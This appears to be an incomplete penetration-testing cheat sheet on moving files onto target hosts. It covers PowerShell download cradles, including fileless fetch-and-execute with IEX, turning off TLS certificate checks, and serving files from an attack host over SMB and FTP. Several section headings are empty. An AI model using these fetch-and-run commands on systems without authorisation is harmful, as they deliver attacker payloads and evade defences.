# File Transfers
## References and Links
[Harmj0y Powershell download cradles](https://gist.github.com/HarmJ0y/bb48307ffa663256e239)

## Linux File Transfers
## Windows File Transfers
### PowerShell Base64 Encode/Decode
```powershell
#Base64 Encode
[Convert]::ToBase64String((Get-Content -path "File_to_Encode" -Encoding byte))
#Base64 Decode
[IO.File]::WriteAllBytes("Output_File", [Convert]::FromBase64String("Base64_Encoded_Payload"))
```
### PowerShell Web Downloads
1. Files vs. Fileless  
a. Files = Download and save the file  
b. Fileless = Download and execute without saving the file 
```powershell
# File Download Example
(New-Object Net.WebClient).DownloadFile('<Target File URL>','<Output File Name>')
(New-Object Net.WebClient).DownloadFileAsync('<Target File URL>','<Output File Name>')

# Fileless Download Example
IEX (New-Object Net.WebClient).DownloadString('<Target File URL>')
# We can also pipe the input directly into IEX
(New-Object Net.WebClient).DownloadString('<Target File URL>') | IEX
``` 
Powershell v3.0 and later can use Invoke-WebRequest(by default is aliased to ```iwr```,```curl```, and ```wget```)
```powershell
Invoke-WebRequest <Target File URL> -OutFile <Output_File_Name>
```
<ins>**Common Errors with Powershell**</ins>  
Internet Explorer first-launch configuration not being completed will prevent downloads. To bypass, use ```-UseBasicParsing```
```Powershell
Invoke-WebRequest <Target file URL> -UseBasicParsing | IEX
```
SSL/TLS secure channel throws an error if the certificate is not trusted.  
Bypass:
```powershell
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
```
### SMB Downloads
Create a quick SMB server in Linux
```bash
# Simple Share
sudo impacket-smbserver share -smb2support /tmp/smbshare

# Share with Authenticated Access
sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test
```

CMD Copy a file from an SMB Server
```cmd
copy \\10.10.10.10\share\file
# This command will be blocked in modern OS's that don't allow unauthenticated guest access
```
CMD Map File share to drive letter with authentication
```cmd
net use n: \\10.10.10.10\share /user:username password
```
### FTP Downloads
FTP Setup on linux attack host
```bash
# Install 
sudo apt install python3-pyftpdlib
# Specify the port, by default pyftpdlib uses port 2121
sudo python3 -m pyftpdlib --port 21
```

Download via FTP using Powershell
```powershell
(New-Object Net.WebClient).DownloadFile('ftp://10.10.10.10/file.txt', '<Output_File_Name>')
```

Create a batch file to download our file(useful if we don't have an interactive shell)
```cmd
echo open 192.168.49.128 > ftpcommand.txt
echo open 192.168.49.128 > ftpcommand.txt
echo USER anonymous >> ftpcommand.txt
echo binary >> ftpcommand.txt
echo GET file.txt >> ftpcommand.txt
echo bye >> ftpcommand.txt
ftp -v -n -s:ftpcommand.txt
```

## Transferring with Code
## Misc File Transfer Methods
## Catching files over HTTP/S
